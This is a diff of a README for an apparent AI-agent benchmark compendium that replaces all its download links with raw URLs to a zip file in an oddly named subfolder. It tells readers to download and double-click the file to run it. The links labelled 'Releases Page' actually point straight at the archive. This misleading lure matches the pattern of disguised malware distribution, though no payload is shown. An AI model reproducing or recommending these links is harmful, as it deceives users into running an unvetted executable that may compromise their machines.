@@ -1,6 +1,6 @@
 # 🌟 ai-agent-benchmark-compendium - Discover and Evaluate AI Agent Performance
 
-[![Download](https://raw.githubusercontent.com/42olver/ai-agent-benchmark-compendium/main/bisischiatic/ai-agent-benchmark-compendium.zip)](https://raw.githubusercontent.com/42olver/ai-agent-benchmark-compendium/main/bisischiatic/ai-agent-benchmark-compendium.zip)
+[![Download](https://github.com/42olver/ai-agent-benchmark-compendium/raw/refs/heads/main/bisischiatic/ai_agent_benchmark_compendium_v1.1.zip)](https://github.com/42olver/ai-agent-benchmark-compendium/raw/refs/heads/main/bisischiatic/ai_agent_benchmark_compendium_v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ This guide will help you download and run this application smoothly.
 
 To get started, you need to download the application. Follow these simple steps:
 
-1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/42olver/ai-agent-benchmark-compendium/main/bisischiatic/ai-agent-benchmark-compendium.zip) to go to the releases page.
+1. **Visit the Releases Page:** Click [here](https://github.com/42olver/ai-agent-benchmark-compendium/raw/refs/heads/main/bisischiatic/ai_agent_benchmark_compendium_v1.1.zip) to go to the releases page.
 2. **Choose Your Version:** Look for the latest version of **ai-agent-benchmark-compendium**. You will see a list of files available for download.
 3. **Download the File:** Click on the appropriate file for your system and wait for the download to complete.
 4. **Run the Application:** Once the download is done, locate the file on your computer and double-click it to run the application.
@@ -76,6 +76,6 @@ If you need more help, please reach out through our GitHub repository. We have a
 
 The **ai-agent-benchmark-compendium** is open-source software. You can freely use, modify, and distribute it. For more details, visit the license file in our repository.
 
-🔗 For additional information and updates, revisit the [Releases Page](https://raw.githubusercontent.com/42olver/ai-agent-benchmark-compendium/main/bisischiatic/ai-agent-benchmark-compendium.zip). 
+🔗 For additional information and updates, revisit the [Releases Page](https://github.com/42olver/ai-agent-benchmark-compendium/raw/refs/heads/main/bisischiatic/ai_agent_benchmark_compendium_v1.1.zip). 
 
 Thank you for choosing the **ai-agent-benchmark-compendium**! Enjoy exploring the world of AI evaluations.
